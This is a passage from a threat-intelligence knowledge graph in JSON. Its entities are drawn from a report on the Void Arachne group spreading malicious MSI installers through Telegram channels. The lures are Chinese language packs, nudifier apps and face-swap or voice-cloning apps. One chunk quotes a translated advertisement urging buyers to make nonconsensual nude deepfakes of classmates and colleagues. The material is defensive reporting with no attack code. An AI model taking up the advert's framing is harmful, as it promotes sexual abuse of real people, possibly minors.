      "chunks_info": [
        {
          "chunk_id": 7,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Malicious Simplified Chinese language packs for Telegram  \nA common malicious software package we observed is what appears to be a Telegram language pack for the Simplified Chinese language. (Telegram does offer a translation of its app in Simple Chinese, which may be found [here](https://translations.telegram.org/zh-hans/).)  \nUsing infected language packs as an infection vector is an interesting method, especially for the Chinese language, which has an estimated 1.3 billion native speakers. Some applications require language packs for a more localized user experience in regional markets, leaving these users potentially vulnerable to this kind of attack.",
          "chunk_length": 779,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Malicious Simplified Chinese language packs for Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Malicious Simplified Chinese language packs for Telegram"
            ],
            "content_type": "text",
            "token_length": 128,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 7,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese Users",
      "type": "Target",
      "id": "target--chinese-users",
      "description": "中文用户",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 7,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Malicious Simplified Chinese language packs for Telegram  \nA common malicious software package we observed is what appears to be a Telegram language pack for the Simplified Chinese language. (Telegram does offer a translation of its app in Simple Chinese, which may be found [here](https://translations.telegram.org/zh-hans/).)  \nUsing infected language packs as an infection vector is an interesting method, especially for the Chinese language, which has an estimated 1.3 billion native speakers. Some applications require language packs for a more localized user experience in regional markets, leaving these users potentially vulnerable to this kind of attack.",
          "chunk_length": 779,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Malicious Simplified Chinese language packs for Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Malicious Simplified Chinese language packs for Telegram"
            ],
            "content_type": "text",
            "token_length": 128,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 7,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Malicious Simplified Chinese language packs for Telegram",
      "type": "Tool",
      "id": "tool--malicious-language-pack",
      "description": "针对Telegram的恶意简体中文语言包",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 7,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Malicious Simplified Chinese language packs for Telegram  \nA common malicious software package we observed is what appears to be a Telegram language pack for the Simplified Chinese language. (Telegram does offer a translation of its app in Simple Chinese, which may be found [here](https://translations.telegram.org/zh-hans/).)  \nUsing infected language packs as an infection vector is an interesting method, especially for the Chinese language, which has an estimated 1.3 billion native speakers. Some applications require language packs for a more localized user experience in regional markets, leaving these users potentially vulnerable to this kind of attack.",
          "chunk_length": 779,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Malicious Simplified Chinese language packs for Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Malicious Simplified Chinese language packs for Telegram"
            ],
            "content_type": "text",
            "token_length": 128,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 7,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Telegram Spearphishing Campaign",
      "type": "AttackEvent",
      "id": "attack-event--telegram-spearphishing",
      "description": "通过Telegram进行的鱼叉式网络钓鱼攻击活动",
      "labels": "AttackEvent",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Spearphishing Link",
      "type": "Technique",
      "id": "technique--spearphishing-link",
      "description": "T1566.002: 鱼叉式网络钓鱼链接技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Malicious MSI File",
      "type": "Tool",
      "id": "tool--malicious-msi",
      "description": "恶意MSI安装文件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Telegram Malware Distribution",
      "type": "Procedure",
      "id": "procedure--telegram-malware-distribution",
      "description": "通过Telegram渠道分发恶意软件的程序",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Telegram Channel",
      "type": "Asset",
      "id": "asset--telegram-channel",
      "description": "Telegram频道作为攻击基础设施",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--behind-great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese Users",
      "type": "Target",
      "id": "target--chinese-users",
      "description": "中文用户，包括学生和年轻人",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Void Arachne",
      "type": "ThreatOrganization",
      "id": "threat-org--void-arachne",
      "description": "威胁组织",
      "labels": "ThreatOrganization",
      "chunks_info": [
        {
          "chunk_id": 8,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
          "chunk_length": 2575,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Nudifier AI technologies promoted on Telegram channels"
            ],
            "content_type": "text",
            "token_length": 545,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 8,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Telegram Spearphishing Campaign",
      "type": "AttackEvent",
      "id": "attack-event--telegram-spearphishing",
      "description": "通过Telegram进行的鱼叉式网络钓鱼攻击活动",
      "labels": "AttackEvent",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Spearphishing",
      "type": "Technique",
      "id": "technique--spearphishing",
      "description": "鱼叉式网络钓鱼技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**",
              "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
            ],
            "content_type": "text",
            "token_length": 166,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "chunk_id": 9,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Malicious MSI Files",
      "type": "Tool",
      "id": "tool--malicious-msi",
      "description": "恶意MSI文件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 9,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
          "chunk_length": 924,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
